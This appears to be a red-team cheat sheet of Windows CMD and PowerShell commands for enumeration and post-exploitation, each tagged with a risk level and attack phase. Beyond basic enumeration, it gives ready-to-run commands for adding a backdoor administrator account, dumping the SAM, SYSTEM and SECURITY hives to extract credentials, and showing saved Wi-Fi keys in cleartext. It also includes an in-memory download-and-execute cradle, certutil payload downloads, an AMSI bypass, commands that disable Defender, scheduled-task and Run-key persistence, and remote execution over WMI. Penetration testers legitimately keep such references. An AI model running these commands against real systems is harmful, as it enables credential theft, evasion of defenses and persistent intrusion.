# Windows Commands

> Native Windows CMD and PowerShell commands for enumeration and post-exploitation

<!-- tags: windows, cmd, powershell, post, enum -->

---

## current user windows
Show the current user, domain, and machine name.

```bash
whoami /all && hostname
```

<!-- meta: risk=safe | phase=enum | tags=whoami,hostname,context -->

---

## system info windows
Display detailed configuration including hotfixes and architecture.

```bash
systeminfo
```

<!-- meta: risk=safe | phase=enum | tags=systeminfo,build,patches -->

---

## os version windows
Quickly extract OS name and version from systeminfo.

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

<!-- meta: risk=safe | phase=enum | tags=systeminfo,os,version -->

---

## list users windows
Show all local user accounts.

```bash
net user
```

<!-- meta: risk=safe | phase=enum | tags=net,user,local -->

---

## show user details windows
Show details, group membership, and last logon for a user.

```bash
net user {{USERNAME:str}}
```

<!-- meta: risk=safe | phase=enum | tags=net,user,details -->

---

## add admin user windows
Create a new user and add to the local Administrators group.

```bash
net user {{USERNAME:str:backup}} {{PASSWORD:str:Password123!}} /add && net localgroup administrators {{USERNAME:str:backup}} /add
```

<!-- meta: risk=high | phase=post | tags=persistence,admin,user -->

---

## ipconfig network windows
Show TCP/IP configuration including DNS and IPv6.

```bash
ipconfig /all
```

<!-- meta: risk=safe | phase=enum | tags=ipconfig,network,dns -->

---

## list connections windows netstat
Show TCP/UDP connections, listening ports, and PIDs.

```bash
netstat -ano
```

<!-- meta: risk=safe | phase=enum | tags=netstat,connections,pid -->

---

## arp cache windows
Display the local ARP table.

```bash
arp -a
```

<!-- meta: risk=safe | phase=enum | tags=arp,table,layer2 -->

---

## routing table windows
Print the local routing table.

```bash
route print
```

<!-- meta: risk=safe | phase=enum | tags=route,routing,table -->

---

## list wifi profiles windows
List saved Wi-Fi profiles on the host.

```bash
netsh wlan show profiles
```

<!-- meta: risk=safe | phase=enum | tags=wifi,profiles,wlan -->

---

## reveal wifi password windows
Display the cleartext key for a saved Wi-Fi profile.

```bash
netsh wlan show profile name="{{PROFILE:str}}" key=clear
```

<!-- meta: risk=med | phase=post | tags=wifi,password,clear -->

---

## list hotfixes windows
Enumerate installed Windows updates and KB numbers.

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<!-- meta: risk=safe | phase=enum | tags=wmic,hotfix,patches -->

---

## list scheduled tasks windows
Print all scheduled tasks with full detail.

```bash
schtasks /query /fo LIST /v
```

<!-- meta: risk=safe | phase=enum | tags=schtasks,persistence,tasks -->

---

## search registry password windows
Recursively search HKLM for the string "password".

```bash
reg query HKLM /f password /t REG_SZ /s
```

<!-- meta: risk=low | phase=post | tags=registry,password,search -->

---

## dump sam system hives windows
Save SAM and SYSTEM registry hives for offline cred extraction.

```bash
reg save HKLM\SAM {{SAM:file:sam.hive}} && reg save HKLM\SYSTEM {{SYSTEM:file:system.hive}}
```

<!-- meta: risk=high | phase=post | tags=sam,system,offline,hashes -->

---

## dump security hive windows
Save the SECURITY hive for LSA secret extraction.

```bash
reg save HKLM\SECURITY {{SEC:file:security.hive}}
```

<!-- meta: risk=high | phase=post | tags=security,lsa,offline -->

---

## list stored creds windows cmdkey
Show usernames and credential targets stored in Windows Credential Manager.

```bash
cmdkey /list
```

<!-- meta: risk=low | phase=post | tags=cmdkey,creds,vault -->

---

## find encrypted files windows
Locate EFS-encrypted files on local drives.

```bash
cipher /u /n
```

<!-- meta: risk=safe | phase=post | tags=cipher,efs,encrypted -->

---

## reveal hidden items windows
Show hidden items including dotfiles and system files.

```bash
gci -force {{PATH:str:.}}
```

<!-- meta: risk=safe | phase=enum | tags=powershell,gci,hidden -->

---

## download file windows iwr
Download a file from a remote URL to disk.

```bash
iwr -Uri {{URL:url}} -OutFile {{OUTFILE:file:C:\\Users\\Public\\file.exe}}
```

<!-- meta: risk=med | phase=post | tags=powershell,iwr,download -->

---

## download file windows certutil
Use certutil to download a payload (off-by-default URL cache).

```bash
certutil -urlcache -split -f {{URL:url}} {{OUTFILE:file:C:\\Users\\Public\\payload.exe}}
```

<!-- meta: risk=med | phase=post | tags=certutil,download,lolbin -->

---

## iex download cradle windows
Download and execute a PowerShell script in memory.

```bash
powershell -ep bypass -nop -c "IEX (IWR {{URL:url}} -UseBasicParsing)"
```

<!-- meta: risk=high | phase=exploit | tags=powershell,iex,cradle -->

---

## encoded command windows powershell
Base64-encode a command and run it via -EncodedCommand.

```bash
powershell -NoProfile -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('{{CMD:str:whoami}}')))
```

<!-- meta: risk=med | phase=exploit | tags=powershell,encoded,obfuscate -->

---

## bypass amsi windows
Disable AMSI for the current PowerShell session.

```bash
powershell -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
```

<!-- meta: risk=high | phase=exploit | tags=amsi,bypass,evasion -->

---

## disable defender windows
Disable Defender real-time monitoring (requires admin).

```bash
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

<!-- meta: risk=high | phase=post | tags=defender,disable,evasion -->

---

## persist schtask logon windows
Create a scheduled task that runs a payload at user logon.

```bash
schtasks /create /tn "{{NAME:str:Updater}}" /tr "powershell.exe -ExecutionPolicy Bypass -File {{PAYLOAD:file:C:\\malicious.ps1}}" /sc onlogon
```

<!-- meta: risk=high | phase=post | tags=schtasks,persistence,logon -->

---

## persist run key windows
Add a registry Run value for current-user persistence.

```bash
powershell -c "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{{NAME:str:Updater}}' -Value '{{CMD:str:powershell.exe -ExecutionPolicy Bypass -File C:\\malicious.ps1}}'"
```

<!-- meta: risk=high | phase=post | tags=registry,run,persistence -->

---

## exec remote wmi windows
Spawn a process on a remote host via WMI.

```bash
wmic /node:{{TARGET:ip}} /user:{{USERNAME:str}} /password:{{PASSWORD:str}} process call create "{{CMD:str:cmd.exe /c whoami}}"
```

<!-- meta: risk=high | phase=exploit | tags=wmic,remote,exec -->

---

## exec remote invoke-command windows
Run a script block on a remote host via PSRemoting.

```bash
powershell -c "Invoke-Command -ComputerName {{TARGET:str}} -ScriptBlock { {{CMD:str:Get-Process}} }"
```

<!-- meta: risk=med | phase=post | tags=powershell,invoke,remote -->

---

## list shares wmi windows
Enumerate SMB shares on a host via WMI.

```bash
powershell -c "Get-WmiObject -Class Win32_Share -ComputerName {{TARGET:str:.}}"
```

<!-- meta: risk=safe | phase=enum | tags=powershell,smb,shares -->

---

## read security eventlog windows
Retrieve recent Security event log entries.

```bash
powershell -c "Get-EventLog -LogName Security -Newest {{COUNT:int:50}}"
```

<!-- meta: risk=safe | phase=enum | tags=eventlog,security,audit -->

## add registry key or value
Create or set a registry value (persistence or config tampering).

```bash
reg add "{{KEYPATH:str}}" /v {{VALUE:str}} /t REG_SZ /d "{{DATA:str}}" /f
```

<!-- meta: risk=medium | phase=post | tags=registry,reg,persistence,windows -->

---
